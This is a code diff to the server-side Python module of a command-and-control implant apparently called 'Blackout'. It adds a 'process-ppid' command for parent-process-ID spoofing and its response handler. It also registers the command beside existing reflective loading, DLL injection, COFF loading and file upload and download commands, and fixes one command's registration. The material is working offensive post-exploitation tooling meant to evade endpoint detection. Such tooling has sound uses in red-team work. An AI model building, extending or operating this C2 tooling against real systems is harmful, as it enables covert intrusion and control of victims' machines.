@@ -12,6 +12,7 @@ COMMAND_REGISTER         = 0x100
 COMMAND_GET_JOB          = 0x101
 COMMAND_NO_JOB           = 0x102
 COMMAND_RUN              = 0x120
+CMD_PPID                 = 0x121
 COMMAND_UPLOAD           = 0x153
 COMMAND_DOWNLOAD         = 0x154
 COMMAND_CLASSIC          = 0x151
@@ -235,8 +236,6 @@ class CommandClassic( Command ):
 
         return Task.buffer
 
-
-
 class CmdRun( Command ):
     CommandId   = COMMAND_RUN
     Name        = "process-create"
@@ -261,6 +260,29 @@ class CmdRun( Command ):
 
         return Task.buffer
     
+class CmdPpid( Command ):
+    CommandId   = CMD_PPID
+    Name        = "process-ppid"
+    Description = "set ppid to spoofing (set 0 for disable)"
+    Help        = ""
+    NeedAdmin   = False
+    Mitr = []   
+    Params = [
+        CommandParam(
+            name="ppid",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int( self.CommandId )
+        Task.add_int( int(arguments[ 'ppid' ]) )
+        
+        return Task.buffer
+
 class CommandPwd( Command ):
     CommandId   = COMMAND_EXPLORER
     Name        = "pwd"
@@ -388,12 +410,13 @@ class Blackout(AgentType):
         CmdReflective(),
         CmdDllInjection(),
         CmdCheckin(),
+        CmdPpid(),
         CmdMemoryAlloc(),
         CommandCoffLdr(),
         CmdProcEnum(),
         CommandClassic(),
         CmdRun(),
-        CommandCd,
+        CommandCd(),
         CommandPwd(),
         CmdSleep(),
         CommandExitP(),
@@ -617,6 +640,11 @@ class Blackout(AgentType):
                 print( PpOutput )
 
                 self.console_message( AgentID, "Good", f"Process create succefully:", Output )
+
+            elif Command == CMD_PPID:
+                ppid = response_parser.parse_int()
+
+                self.console_message( AgentID, "Good", f"Ppid set to {ppid} for spoofing", "" )
 
             elif Command == COMMAND_EXPLORER:
                 explorer_id = response_parser.parse_int()
